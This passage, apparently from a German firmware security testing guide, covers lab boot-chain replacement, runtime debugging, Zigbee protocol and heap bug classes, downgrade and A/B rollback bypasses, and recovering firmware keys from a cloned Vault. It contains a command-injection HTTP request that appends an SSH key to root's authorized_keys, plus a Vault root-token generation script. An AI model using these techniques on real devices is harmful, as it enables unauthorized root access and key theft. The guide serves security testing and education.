Ein nützlicher Validierungsablauf ist:<sup>[[11]](#references)</sup>

1. Ermittle aus dem Verifier-/Init-Binary für jedes `dm-linear`-Segment das Quellgerät, den Startsektor und die Länge.
2. Verknüpfe die Extents oder mappe sie, ohne ihre Ausrichtungssemantik zu verändern.
3. Falls die Extraktion weiterhin fehlschlägt, durchsuche nur ein kleines Fenster um die vorhergesagte Grenze und verlange mehrere aufeinanderfolgende gültige Metadatenstrukturen, statt allein einen plausiblen Superblock zu akzeptieren.
4. Führe ein unverändertes `unsquashfs` mit dem rekonstruierten Image aus; die erfolgreiche Traversierung aller Verzeichnisse und Fragmente ist ein stärkerer Beleg als `unsquashfs -stat`.

#### Vom Analysten kontrollierter dm-verity-Ersatz

Wenn der Analyst den QEMU-Kernel, das Initramfs und die virtuellen Laufwerke kontrolliert, kann ein modifiziertes Root gebootet werden, indem die Verifizierungs-PID 1 des Herstellers durch ein kleines statisch gelinktes Init ersetzt wird. Dies ist eine **Ersetzung der Boot-Kette im Labor**, kein Bruch von dm-verity, dessen RSA-Signatur, Secure Boot oder einem TPM-versiegelten Schlüssel.<sup>[[11]](#references)</sup>

Das Ersatz-Init sollte die betrieblichen Schritte des ursprünglichen Boot-Pfads nachbilden: `devtmpfs` mounten, `setsid()` aufrufen, `/dev/console` mit den Dateideskriptoren 0–2 verbinden, `/proc` und `/sys` mounten, auf das bereitgestellte Blockgerät warten, das bearbeitete Root schreibgeschützt mounten, die Pseudo-Dateisysteme des alten Roots aushängen, den neuen Mount auf `/` verschieben, `chroot` ausführen und das ursprüngliche `/sbin/init` der Firmware mit `execve()` starten. Durch das Aushängen von `/dev`, `/proc` und `/sys` **vor** `MS_MOVE` wird verhindert, dass versehentlich Mountpoints des neuen Roots ausgehängt werden.<sup>[[11]](#references)</sup>

Halte den veränderlichen Gerätezustand getrennt vom modifizierten unveränderlichen Root. Ein qcow2-Overlay kann den LVM-Zustand der ursprünglichen Festplatte erhalten, während ein zweites schreibgeschütztes virtio-Laufwerk das bearbeitete SquashFS bereitstellt:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Offline-Debugging des Image-Zustands

Untersuche den persistenten Zustand außerhalb des Gast systems, wenn langsame Bootvorgänge, destruktive Startskripte oder unzuverlässige Konsolenprotokollierung die Fehlerursache verschleiern. Binde niemals ein Overlay ein, das von einer laufenden VM verwendet wird; stelle es mit `qemu-nbd` bereit, beschränke die LVM-Erkennung auf die vorgesehene NBD-Partition und deaktiviere die Volume Group, bevor du die Verbindung trennst.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Für eine reproduzierbare Fehlerisolierung schreibe zeitgestempelte Markierungsdateien auf ein stabiles, beschreibbares Volume und überprüfe sie offline; `/dev/kmsg`, FIFOs und kurzlebige Konsolen können durch Rate-Limiting oder einen frühen Prozessabbruch falsch negative Ergebnisse liefern. Vergleiche außerdem die exakten Schnittstellen zwischen den Ebenen, bevor du nicht zusammenhängenden Code änderst: `uname -r` mit `/lib/modules/`, die ext4-Funktionen auf dem Datenträger mit der Kernel-Konfiguration und die Mesa-`libGL`-Generation mit der DRI-Treiberschnittstelle sowie den aus PCI abgeleiteten Treibernamen. Eine Komponente kann vorhanden sein und sogar erfolgreich per `dlopen()` geladen werden, aber dennoch unbrauchbar sein, weil der Verbraucher eine andere ABI erwartet.<sup>[[11]](#references)</sup>

## Dynamische Analyse in der Praxis

In dieser Phase wird entweder eine echte oder eine emulierte Geräteumgebung zur Analyse verwendet. Es ist wichtig, Shell-Zugriff auf das Betriebssystem und das Dateisystem aufrechtzuerhalten. Die Emulation bildet Hardwareinteraktionen möglicherweise nicht perfekt nach, sodass gelegentlich ein Neustart der Emulation erforderlich ist. Bei der Analyse sollten das Dateisystem erneut untersucht, offengelegte Webseiten und Netzwerkdienste ausgenutzt und Bootloader-Schwachstellen erkundet werden. Tests der Firmware-Integrität sind entscheidend, um potenzielle Backdoor-Schwachstellen zu erkennen.

## Laufzeitanalysetechniken

Bei der Laufzeitanalyse interagierst du mit einem Prozess oder einer Binärdatei in ihrer Betriebsumgebung. Dabei kommen Tools wie gdb-multiarch, Frida und Ghidra zum Setzen von Breakpoints und zum Auffinden von Schwachstellen durch Fuzzing und andere Techniken zum Einsatz.

Bei Embedded-Zielen ohne vollständigen Debugger **kopiere einen statisch gelinkten `gdbserver`** auf das Gerät und verbinde dich remote:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee-/Radio-Coprozessor-Nachrichten-Mapping

Bei IoT-Hubs ist der RF-Stack oft auf einen **Radio-MCU** und einen Linux-Userland-Prozess aufgeteilt. Ein nützlicher Workflow bildet den Pfad ab:<sup>[[8]](#references)</sup>

1. **RF-Frame** über Funk
2. **Parser auf der Controller-Seite** des Radio-MCU
3. **Serial-/UART-Text- oder TLV-Protokoll**, das an Linux weitergeleitet wird (zum Beispiel `/dev/tty*`)
4. **Application-Dispatcher** im Haupt-Daemon
5. **Protokollspezifischer Handler / Zustandsautomat**

Diese Architektur schafft zwei Reverse-Engineering-Ziele statt einem. Wenn der Controller binäre Funk-Frames in ein Textprotokoll wie `Group,Command,arg1,arg2,...` umwandelt, ermittle:

- Die **Nachrichtengruppen** und Dispatch-Tabellen
- Welche Nachrichten aus dem **Netzwerk** kommen können und welche vom Controller selbst
- Die genauen **herstellerspezifischen Unterscheidungsfelder** (zum Beispiel Zigbee `manufacturer_code` und benutzerdefiniertes `cluster_command`)
- Welche Handler nur während **Commissioning**, Discovery oder Firmware-/Model-Download-Phasen erreichbar sind

Bei Zigbee solltest du den Pairing-Verkehr aufzeichnen und prüfen, ob das Ziel noch auf den standardmäßigen **Link Key** `ZigBeeAlliance09` setzt. Falls ja, kann das Mitschneiden des Commissioning-Verkehrs den **Network Key** offenlegen. Zigbee 3.0 Install Codes verringern dieses Risiko. Halte daher fest, ob das getestete Gerät sie tatsächlich erzwingt.

### Herstellerspezifische Protokoll-Handler und durch FSM gesteuerte Erreichbarkeit

Herstellerspezifische Zigbee-/ZCL-Befehle sind oft ein besseres Ziel als standardisierte Cluster, da sie **benutzerdefinierten Parsing-Code** und interne **FSMs** mit weniger praxiserprobter Validierung erreichen.<sup>[[8]](#references)</sup>

Praktischer Workflow:

- Reverse-Engineere den Command-Dispatcher, bis du den **nur für den Hersteller vorgesehenen Handler** findest.
- Ermittle die Tabellen für **FSM-Zustand**, **Ereignis**, **Prüfung**, **Aktion** und **Folgezustand**.
- Identifiziere **Übergangszustände**, die automatisch fortschreiten, sowie Retry-/Fehlerzweige, die schließlich angreifergesteuerten Zustand zurücksetzen oder freigeben.
- Bestätige, welche legitimen Protokollaustausche nötig sind, um den Daemon in den verwundbaren Zustand zu versetzen, statt davon auszugehen, dass der fehlerhafte Handler immer erreichbar ist.

Bei zeitkritischen Protokollen kann die Paketwiedergabe mit einem Python-Framework zu langsam sein. Zuverlässiger ist es, ein legitimes Gerät auf echter Hardware (zum Beispiel einem **nRF52840**) mit einem Stack in Herstellerqualität zu emulieren, damit die korrekten **Endpoints**, **Attribute** und das richtige Commissioning-Timing verwendet werden.

### Fehlerklasse: fragmentierte Downloads in Embedded-Daemons

Eine wiederkehrende Firmware-Fehlerklasse tritt bei **fragmentierten Blob-/Model-/Konfigurations-Downloads** auf:<sup>[[8]](#references)</sup>

1. Das **erste Fragment** (`offset == 0`) speichert `ctx->total_size` und weist mit `malloc(total_size)` Speicher zu.
2. Spätere Fragmente validieren nur die vom Angreifer kontrollierten **paketlokalen** Felder, etwa `packet_total_size >= offset + chunk_len`.
3. Beim Kopieren wird `memcpy(&ctx->buffer[offset], chunk, chunk_len)` verwendet, ohne die **ursprüngliche zugewiesene Größe** zu prüfen.

Dadurch kann ein Angreifer Folgendes senden:

- Ein gültiges erstes Fragment mit einer **kleinen** angegebenen Gesamtgröße, um eine kleine Heap-Allokation zu erzwingen.
- Ein späteres Fragment mit dem **erwarteten Offset**, aber einem größeren `chunk_len`.
- Eine gefälschte paketlokale Größe, die die erneuten Prüfungen besteht und trotzdem den ursprünglich zugewiesenen Buffer überlaufen lässt.

Wenn der verwundbare Pfad hinter der Commissioning-Logik liegt, muss der Exploit genügend **Geräteemulation** enthalten, um das Ziel vor dem Senden der fehlerhaften Fragmente in den erwarteten Model-Download- oder Blob-Download-Zustand zu versetzen.

### Protokollgesteuerte `free()`-Trigger

Bei Embedded-Daemons ist es oft einfacher, Heap-Metadaten-Exploitation auszulösen, indem man nicht auf die Bereinigung wartet, sondern **die Fehlerbehandlung des Protokolls erzwingt**:<sup>[[8]](#references)</sup>

- Sende fehlerhafte Folgefragmente, um die FSM in **Retry**- oder **Fehlerzustände** zu versetzen.
- Überschreite die Retry-Grenze, damit der Daemon den **Kontext zurücksetzt** und den beschädigten Buffer freigibt.
- Nutze dieses vorhersehbare `free()`, um Allocator-Primitives auszulösen, bevor der Prozess aus anderen Gründen abstürzt.

Das ist besonders nützlich bei **musl-/uClibc-/dlmalloc-ähnlichen** Allocators in Embedded Linux, wo beschädigte Chunk-Metadaten die Unlink-/Unbin-Logik in ein Write-Primitive verwandeln können. Ein stabiles Muster besteht darin, ein **Größenfeld** so zu beschädigen, dass die Traversierung des Allocators auf **Fake Chunks innerhalb des übergelaufenen Buffers** umgeleitet wird, statt sofort echte Bin-Pointer zu überschreiben und den Prozess zum Absturz zu bringen.

## Binäre Ausnutzung und Proof-of-Concept

Die Entwicklung eines PoC für identifizierte Schwachstellen erfordert ein tiefes Verständnis der Zielarchitektur und Programmierung in hardwarenahen Sprachen. Binäre Laufzeitschutzmechanismen sind in Embedded-Systemen selten. Sind sie jedoch vorhanden, können Techniken wie Return Oriented Programming (ROP) erforderlich sein.

### Hinweise zur uClibc-Fastbin-Exploitation (Embedded Linux)

- **Fastbins + Konsolidierung:** uClibc verwendet Fastbins ähnlich wie glibc. Eine spätere große Allokation kann `__malloc_consolidate()` auslösen. Fake Chunks müssen daher Prüfungen bestehen (plausible Größe, `fd = 0` und umgebende Chunks, die als „in Benutzung“ erkannt werden).<sup>[[6]](#references)</sup>
- **Non-PIE-Binärdateien unter ASLR:** Wenn ASLR aktiviert, die Haupt-Binärdatei aber **non-PIE** ist, sind Adressen in der `.data`-/`.bss`-Sektion innerhalb der Binärdatei stabil. Du kannst einen Bereich anvisieren, der bereits einem gültigen Heap-Chunk-Header ähnelt, um eine Fastbin-Allokation auf eine **Function-Pointer-Tabelle** zu lenken.
- **NUL-Zeichen zum Stoppen des Parsers:** Beim Parsen von JSON kann ein `\x00` im Payload das Parsing beenden und zugleich nachfolgende, vom Angreifer kontrollierte Bytes für einen Stack Pivot bzw. eine ROP-Chain erhalten.
- **Shellcode über `/proc/self/mem`:** Eine ROP-Chain, die `open("/proc/self/mem")`, `lseek()` und `write()` aufruft, kann ausführbaren Shellcode in einem bekannten Mapping platzieren und zu ihm springen.

## Vorbereitete Betriebssysteme für Firmware-Analyse

Betriebssysteme wie [AttifyOS](https://github.com/adi0x90/attifyos) und [EmbedOS](https://github.com/scriptingxss/EmbedOS) bieten vorkonfigurierte Umgebungen für Firmware-Sicherheitstests, ausgestattet mit den erforderlichen Tools.

## Vorbereitete Betriebssysteme zur Analyse von Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ist eine Distribution, die dich bei der Sicherheitsbewertung und beim Penetration Testing von IoT-Geräten unterstützt. Sie spart viel Zeit, da sie eine vorkonfigurierte Umgebung mit allen erforderlichen Tools bereitstellt.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Ein auf Ubuntu 18.04 basierendes Betriebssystem für Embedded-Sicherheitstests, das bereits mit Tools für Firmware-Sicherheitstests ausgestattet ist.

## Firmware-Downgrade-Angriffe und unsichere Update-Mechanismen

Selbst wenn ein Hersteller kryptografische Signaturprüfungen für Firmware-Images implementiert, wird der **Schutz vor Versions-Rollbacks (Downgrades)** häufig ausgelassen. Wenn der Boot- oder Recovery-Loader nur die Signatur mit einem eingebetteten öffentlichen Schlüssel prüft, aber nicht die *Version* (oder einen monoton steigenden Zähler) des zu flashenden Images vergleicht, kann ein Angreifer ein **älteres, verwundbares Firmware-Image mit gültiger Signatur** installieren und so bereits behobene Schwachstellen wieder einführen.<sup>[[4]](#references)</sup>

Typischer Angriffsablauf:

1. **Ein älteres signiertes Image beschaffen**
   * Von einem öffentlichen Download-Portal, CDN oder der Support-Website des Herstellers abrufen.
   * Aus zugehörigen Mobile-/Desktop-Anwendungen extrahieren (z. B. aus `assets/firmware/` in einem Android-APK).
   * Aus Drittanbieter-Repositories wie VirusTotal, Internetarchiven, Foren usw. beziehen.
2. **Das Image über einen verfügbaren Update-Kanal auf das Gerät hochladen oder bereitstellen:**
   * Web-UI, Mobile-App-API, USB, TFTP, MQTT usw.
   * Viele IoT-Geräte für Endverbraucher stellen *nicht authentifizierte* HTTP(S)-Endpunkte bereit, die Base64-kodierte Firmware-Blobs akzeptieren, serverseitig dekodieren und die Wiederherstellung bzw. das Upgrade auslösen.
3. Nach dem Downgrade eine Schwachstelle ausnutzen, die in der neueren Version behoben wurde (zum Beispiel einen später hinzugefügten Filter gegen Command Injection).
4. Optional das neueste Image zurückflashen oder Updates deaktivieren, um nach dem Erlangen von Persistenz eine Entdeckung zu vermeiden.

### Beispiel: Command Injection nach einem Downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

In der anfälligen (zurückgestuften) Firmware wird der Parameter `md5` ohne Bereinigung direkt an einen Shell-Befehl angehängt, wodurch die Ausführung beliebiger Befehle möglich ist (hier: SSH-schlüsselbasierten Root-Zugriff aktivieren). Spätere Firmware-Versionen führten einen einfachen Zeichenfilter ein, doch das Fehlen eines Downgrade-Schutzes macht die Korrektur wirkungslos.<sup>[[4]](#references)</sup>

### Firmware aus mobilen Apps extrahieren

Viele Hersteller bündeln vollständige Firmware-Images in ihren zugehörigen mobilen Apps, damit die App das Gerät über Bluetooth/Wi-Fi aktualisieren kann. Diese Pakete sind häufig unverschlüsselt im APK/APEX unter Pfaden wie `assets/fw/` oder `res/raw/` gespeichert. Mit Tools wie `apktool`, `ghidra` oder sogar einfachem `unzip` lassen sich signierte Images extrahieren, ohne die physische Hardware anzufassen.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Updater-only-Umgehung des Anti-Rollback-Schutzes bei A/B-Slot-Designs

Einige Anbieter implementieren zwar einen **Downgrade-Ratchet**, aber nur in der *Updater*-Logik (zum Beispiel in einer UDS-Routine über CAN, einem Recovery-Befehl oder einem OTA-Agent im Userspace). Wenn der **Bootloader** später nur die Signatur/CRC des Images prüft und der Partitionstabelle oder den Slot-Metadaten vertraut, lässt sich der Rollback-Schutz weiterhin umgehen.<sup>[[7]](#references)</sup>

Typisches schwaches Design:

- Firmware-Metadaten enthalten sowohl einen Versionsdeskriptor als auch einen **Security-Ratchet** / monotonen Zähler.
- Der Updater vergleicht den Ratchet des Images mit einem in persistentem Speicher abgelegten Wert und lehnt ältere signierte Images ab.
- Der Bootloader **wertet diesen Ratchet nicht aus** und prüft vor dem Booten des ausgewählten Slots lediglich Header, CRC und Signatur.
- Die Slot-Aktivierung wird separat in einer Partitionstabelle oder einem Generationszähler pro Slot gespeichert und ist **nicht kryptografisch an den exakten Digest der validierten Firmware gebunden**.

Dadurch entsteht bei Dual-Slot-Systemen ein **Primitive zum Validieren eines Images und Booten eines anderen**. Wenn der Angreifer den Updater dazu bringen kann, Slot B mithilfe eines aktuellen signierten Images als nächstes Boot-Ziel zu markieren und Slot B anschließend vor dem Neustart überschreiben kann, bootet der Bootloader möglicherweise trotzdem das Downgrade-Image, weil er nur den bereits übernommenen Slot-Metadaten vertraut.

Gängiges Missbrauchsmuster:

1. Eine **aktuelle signierte** Firmware in den passiven Slot hochladen und die normale Validierungs-/Umschaltroutine ausführen, sodass das Layout diesen Slot als nächstes aktives Ziel markiert.
2. **Noch nicht neu starten**. In derselben Sitzung die Routine zur Slot-Vorbereitung/Löschung erneut aufrufen.
3. Veraltete Boot-Status- oder Slot-Auswahllogik missbrauchen, sodass der Updater **denselben physischen Slot** löscht, der gerade aktiviert wurde.
4. Eine **ältere, aber weiterhin signierte** Firmware in diesen Slot schreiben.
5. Die Validierungsroutine umgehen, die den Ratchet erzwingt, und direkt neu starten.
6. Der Bootloader wählt den aktivierten Slot aus, prüft nur Signatur/Integrität und bootet das alte Image.

Worauf beim Reverse Engineering von A/B-Update-Implementierungen zu achten ist:

- Slot-Auswahl anhand von **Boot-Zeit-Flags**, die nach einer erfolgreichen Umschaltung nicht aktualisiert werden.
- Eine Routine vom Typ `prepare_passive_slot()`, die einen Slot anhand veralteter Zustandsdaten statt anhand des **aktuell übernommenen Layouts** löscht.
- Eine Funktion vom Typ `part_write_layout()`, die lediglich einen **Generationszähler** / ein Active-Flag erhöht und den Hash des validierten Images nicht speichert.
- Ratchet-Prüfungen, die im Userspace oder im Updater-Code implementiert sind, aber **nicht in den ROM-, Bootloader- oder Secure-Boot-Stufen**.
- Lösch- oder Recovery-Routinen, die den Slot auch dann als bootfähig markieren, wenn sein Inhalt entfernt und neu geschrieben wurde.

### Checkliste zur Bewertung der Update-Logik

* Ist der Transport/zur Authentifizierung des *Update-Endpunkts* angemessen geschützt (TLS + Authentifizierung)?
* Vergleicht das Gerät vor dem Flashen **Versionsnummern** oder einen **monotonen Anti-Rollback-Zähler**?
* Wird das Image innerhalb einer Secure-Boot-Kette verifiziert (z. B. durch Signaturprüfungen im ROM-Code)?
* Erzwingt der **Bootloader denselben Ratchet** wie der Updater, statt nur Signatur/CRC zu prüfen?
* Sind die Metadaten zur Slot-Aktivierung **an den Digest/die Version der validierten Firmware gebunden**, oder kann ein Slot nach seiner Aktivierung verändert werden?
* Muss das Gerät nach einer erfolgreichen Slot-Umschaltung zwingend neu starten, oder sind spätere Update-/Löschroutinen in derselben Sitzung weiterhin erreichbar?
* Führt der Userspace-Code zusätzliche Plausibilitätsprüfungen durch (z. B. zulässige Partitionszuordnung, Modellnummer)?
* Verwenden *partielle* oder *Backup*-Update-Abläufe dieselbe Validierungslogik?

> 💡  Fehlt einer der oben genannten Punkte, ist die Plattform wahrscheinlich anfällig für Rollback-Angriffe.

## Verwundbare Firmware zum Üben

Um das Auffinden von Schwachstellen in Firmware zu üben, eignen sich die folgenden verwundbaren Firmware-Projekte als Ausgangspunkt.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Wiederherstellung von Firmware-Entschlüsselungsschlüsseln aus eingebettetem KMS-/Vault-Zustand

Wenn ein Update-Image kleine Klartext-Metadaten mit einem großen Blob hoher Entropie kombiniert, sollte vor jedem Brute-Force-Versuch zunächst der Container untersucht werden:<sup>[[1]](#references)</sup>

- Header, Offsets und Zeilengrenzen mit `hexdump`, `xxd`, `strings -tx`, `base64 -d` und `binwalk -E` ausgeben.
- `Salted__` weist üblicherweise auf das OpenSSL-Format `enc` hin: Die nächsten 8 Bytes sind der Salt, die übrigen Bytes der Chiffretext.
- Ein Base64-Feld, das zu genau `256` Bytes dekodiert wird, ist ein starker Hinweis darauf, dass es sich um einen RSA-2048-Chiffretext handelt, der ein zufälliges Firmware-Passwort/einen Session-Schlüssel verschlüsselt.
- Separates PGP-Material in derselben Datei dient oft nur dem Schutz der Authentizität; es ist nicht zwangsläufig der Mechanismus zur Vertraulichkeit.

Wenn die Suche nach statischen Schlüsseln (`grep`, `strings`, PEM-/PGP-Suchen) erfolglos bleibt, sollte stattdessen der **operative Entschlüsselungspfad** untersucht werden, anstatt nur nach privaten Schlüsseln zu suchen:

- Den Updater/die Verwaltungs-Binärdatei dekompilieren und nachverfolgen, wer den verschlüsselten Blob liest, welcher Helper/welche API ihn entschlüsselt und welchen logischen Schlüsselnamen sie anfordert.
- Das extrahierte Root-Dateisystem nach KMS-Zustand (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) sowie Unit-Dateien und Init-Skripten durchsuchen.
- Klartextbefehle wie `vault operator unseal ...`, Recovery-Schlüssel, Bootstrap-Token oder lokale KMS-Auto-Unseal-Skripte wie Material für private Schlüssel behandeln.

Wenn das Gerät die originale Vault-Binärdatei und das Storage-Backend enthält, ist es meist einfacher, diese Umgebung nachzustellen, als die Vault-Interna neu zu implementieren:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Mit root auf dem geklonten KMS:

- Transit-Schlüssel nur im isolierten Klon exportierbar machen: `vault write transit/keys/<name>/config exportable=true`
- Den unwrap-Schlüssel exportieren: `vault read transit/export/encryption-key/<name>`
- Den wiederhergestellten RSA-Schlüssel mit genau dem vom KMS verwendeten Padding-/Hash-Paar testen. Eine fehlgeschlagene PKCS#1-v1.5-Entschlüsselung und eine fehlgeschlagene OAEP-Entschlüsselung mit Standardeinstellungen beweisen **nicht**, dass der Schlüssel falsch ist. Viele von Vault unterstützte Abläufe verwenden OAEP mit SHA-256, während gängige Bibliotheken standardmäßig SHA-1 verwenden.
- Beginnt die Payload mit `Salted__`, muss vor dem Versuch einer AES-CBC-Entschlüsselung die OpenSSL-KDF des Herstellers exakt nachgebildet werden (`EVP_BytesToKey`, bei älteren Appliances häufig MD5).

Damit wird aus „verschlüsselter Firmware“ ein allgemeineres Problem: **die operativen Schlüssel auf der Appliance wiederherstellen und anschließend die exakten Unwrap- und KDF-Parameter offline nachbilden**.

## Schulungen und Zertifizierungen

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Firmware knacken mit Claude: Senior-Level-Fähigkeiten, Autonomie auf Junior-Level](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Methodik für Firmware-Sicherheitstests](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktisches IoT-Hacking: Der umfassende Leitfaden zum Angriff auf das Internet der Dinge](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Zero-Days in aufgegebener Hardware ausnutzen – Trail-of-Bits-Blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Wie mir ein 20-Dollar-Smartgerät Zugriff auf Ihr Zuhause verschaffte](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Jetzt siehst du mi: Jetzt bist du gehackt](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv – Den Tesla Wall Connector über den Ladeanschluss ausnutzen – Teil 2: Die Anti-Downgrade-Schutzmaßnahme umgehen](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Lass es blinken: Over-the-Air-Exploitation der Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [Tesla OS auf QEMU rooten, Teil 1: Entpacken](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux-Kernel-Dokumentation – dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [Tesla OS auf QEMU rooten, Teil 2: Debuggen und Reparieren](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell-BIOS-Passwörter: Schwache XOR-Verschlüsselung ermöglicht Wiederherstellung aus SPI-Flash (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn – Tools zur Wiederherstellung von Dell-BIOS-Passwörtern](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security – Hardware-Hacking auffrischen, Teil 2](https://voidstarsec.com/blog/brushing-up-part-2)
{{#include ../../banners/hacktricks-training.md}}
